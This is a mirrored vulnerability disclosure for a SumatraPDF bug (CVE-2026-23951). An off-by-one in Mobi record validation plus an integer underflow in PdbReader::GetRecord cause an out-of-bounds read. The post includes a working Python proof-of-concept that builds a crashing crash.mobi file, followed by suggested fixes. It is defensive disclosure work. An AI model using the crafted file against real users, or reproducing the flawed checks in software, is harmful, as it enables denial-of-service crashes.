---
title: "SumatraPDFreader - CVE-2026-23951"
date: "2026-01-23"
tags: ["sumatrapdfreader", "underflow", "oob"]
---

github advisory: https://github.com/sumatrapdfreader/sumatrapdf/security/advisories/GHSA-hj4w-c5x8-p2hv

# Mirror

# Integer Underflow in PalmDbReader Leading to Crash

## Summary
Found a bug in `PalmDbReader::GetRecord` that crashes SumatraPDF when opening a crafted Mobi file. There's an off-by-one error in the validation code that only triggers with exactly 2 records, which then causes an integer underflow in the size calculation. The result is an out-of-bounds heap read that crashes the app.

## Details
**File:** `src/PalmDbReader.cpp`  
**Functions:** `PdbReader::ParseHeader`, `PdbReader::GetRecord`  
**Impact:** DoS (application crash)

### How it works

The bug has two parts that work together:

**Part 1: Validation doesn't run for 2-record files**

There's a loop in `PdbReader::ParseHeader` that checks record offsets are in order:
```cpp
u32 prevOff = recInfos[0].offset;
for (size_t i = 1; i < nRecs - 1; i++) {
    u32 off = recInfos[i].offset;
    if (prevOff > off) { return false; }
    prevOff = off;
}
```

When `nRecs = 2`, the condition `i < 1` means the loop body never runs. So a 2-record file can have inverted offsets and still pass validation.

**Part 2: Underflow in size calculation**

`PdbReader::GetRecord` calculates record size like this:
```cpp
size_t off = recInfos[recNo].offset;
size_t nextOff = dataSize;
if (recNo != nRecs - 1) {
    nextOff = recInfos[recNo + 1].offset;
}
ReportIf(off > nextOff); // only logs, doesn't abort
size_t size = nextOff - off; // underflows here
return {(u8*)data + off, size};
```

With a malformed file where record 0 is at offset 200 and record 1 at offset 150, we get `size = 150 - 200` which wraps to something huge like `0xFFFFFFFFFFFFFFCE`.

**Part 3: The crash**

Functions like `MobiDoc::ParseHeader` and `DecodeExthHeader` trust this size value. When they try to read that much data, they hit unmapped memory and crash.

## PoC

Here's a script that generates a crashing file:

<details>

<summary>generate_poc.py</summary>

```python

import struct

def create_mobi_poc(filename):
    # PDB header with 2 records
    pdb_name = b"CrashMobi" + b"\x00" * 23
    pdb_header = struct.pack(">32sHH12sIII8sIIH", 
                             pdb_name, 0, 0, b"\x00" * 12, 0, 
                             0, 0, b"BOOKMOBI", 0, 0, 2)
    
    # Inverted offsets - rec1 comes before rec0 in the file
    rec0_offset = 200
    rec1_offset = 150
    
    rec0_info = struct.pack(">IB3s", rec0_offset, 0, b"\x00\x00\x00")
    rec1_info = struct.pack(">IB3s", rec1_offset, 0, b"\x00\x00\x00")
    
    # Minimal mobi headers
    palmdoc_header = struct.pack(">HHIHHHH", 1, 0, 100, 1, 4096, 0, 0)
    
    mh_data = bytearray(232)
    mh_data[0:4] = b"MOBI"
    struct.pack_into(">I", mh_data, 4, 232)
    struct.pack_into(">I", mh_data, 8, 2)
    struct.pack_into(">I", mh_data, 12, 65001)
    struct.pack_into(">I", mh_data, 112, 0x40)  # EXTH flag
    
    rec0_content = palmdoc_header + mh_data
    
    # EXTH header claiming 256MB of data
    exth_rec = struct.pack(">II", 100, 0x10000000)
    exth_header = struct.pack(">4sII", b"EXTH", 20, 1) + exth_rec
    rec0_content += exth_header
    
    # Build the file structure
    padding1 = b"\x00" * (rec1_offset - 94)
    rec1_content = b"JUNK" * 10
    padding2 = b"\x00" * (rec0_offset - (rec1_offset + len(rec1_content)))
    
    with open(filename, "wb") as f:
        f.write(pdb_header)
        f.write(rec0_info)
        f.write(rec1_info)
        f.write(padding1)
        f.write(rec1_content)
        f.write(padding2)
        f.write(rec0_content)

if __name__ == "__main__":
    create_mobi_poc("crash.mobi")
    print("Created crash.mobi")

```

</details>

Run it and open `crash.mobi` in SumatraPDF. It'll crash in `DecodeExthHeader` trying to read the bogus 256MB.

## Fix

The validation loop needs to start from 0:
```cpp
for (size_t i = 0; i < nRecs - 1; i++) {
    if (recInfos[i].offset > recInfos[i+1].offset) {
        return false;
    }
}
```

And `GetRecord` should actually check bounds instead of just logging:
```cpp
if (off > nextOff) {
    return {};
}
```

Optionally add a max size check too (like 128MB).